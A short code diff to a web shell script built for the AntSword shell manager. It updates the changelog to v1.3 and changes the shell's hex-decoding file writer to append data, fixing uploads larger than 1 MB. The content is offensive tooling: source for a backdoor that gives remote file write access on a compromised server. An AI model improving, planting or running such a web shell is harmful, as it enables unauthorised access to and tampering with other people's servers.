@@ -22,7 +22,9 @@
  4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
 
 ChangeLog:
-  Data: 2016/04/29 v1.2
+  v1.3
+   1. 修正上传文件超过1M时的bug
+  Date: 2016/04/29 v1.2
    1. 修正修改包含结束tag的文件会出错的 bug
   Date: 2016/04/06 v1.1
    1. 修正下载文件参数设置错误
@@ -185,7 +187,7 @@ ChangeLog:
         String h = "0123456789ABCDEF";
         File f = new File(savefilePath);
         f.createNewFile();
-        FileOutputStream os = new FileOutputStream(f);
+        FileOutputStream os = new FileOutputStream(f,true);
         for (int i = 0; i < fileHexContext.length(); i += 2) {
             os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i + 1))));
         }
